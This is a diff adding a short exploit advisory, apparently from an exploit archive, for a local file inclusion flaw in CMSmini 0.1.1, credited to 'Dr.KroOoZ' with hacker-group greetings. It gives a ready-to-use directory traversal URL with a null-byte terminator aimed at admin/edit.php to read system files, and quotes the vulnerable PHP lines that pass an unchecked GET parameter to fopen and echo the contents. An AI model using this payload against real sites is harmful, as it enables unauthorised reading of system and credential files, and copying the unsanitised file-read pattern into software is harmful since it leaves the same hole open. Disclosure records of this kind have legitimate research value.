@@ -1,0 +1,41 @@
++-----------------------------------------+
+# Exploit Title: CMSmini 0.1.1 Local File incluse 
+# Author: Dr.KroOoZ
+# Software : http://sourceforge.net/projects/cmsmini/files/cmsmini/cmsmini-0.1/cmsmini-0.1.tar.gz/download
+# Tested on: Linux - Windows
+# Dork : No Dork :D
++-----------------------------------------+
+       _           _     _      ___        
+      | |         | |   | |    / _ \       
+      | |_   _ ___| |_  | |__ | | | |__  __
+  _   | | | | / __| __| | '_ \| | | |\ \/ /
+ | |__| | |_| \__ \ |_  | |_) | |_| | >  < 
+  \____/ \__,_|___/\__| |_.__/ \___/ /_/\_\
+                                           
++-----------------------------------------+										   
+[-] Exploit :
+
+http://localhost/cmsmini-0.1/admin/edit.php?name=../../../../../../../../../../../../boot.ini%00
+
+Open /cmsmini-0.1/admin/edit.php
+|===================================================>
+| Line |                                            |
+| 30   | $name = $_GET['name'];                     |
+| 73   | $filename = $dirpath.'/'.$name;            |
+| 74   | $fh = fopen($filename, 'r');               |
+| 75   | $data = fread($fh, filesize($filename));   |
+| 76   | fclose($fh);                               |
+| 77   | echo $data;                                |
+<===================================================>
+
+
++-----------------------------------------+ 
+[»] Mail : Root@TTGSa.CoM
+[»] Mail : www.d-k-t.tk
++-----------------------------------------+
+[»] Dream'z KilleR [ D.K ] :
+[ Dr.KroOoZ - No-QRQR ]
++-----------------------------------------+
+[»] Greetz to:
+[ New KilleR & b0x & FoX HaCkeR & Sn!pEr.S!Te & Ales McGregor & MjNoN HaCkEr & HaNiBaL KSA ]
++-----------------------------------------+
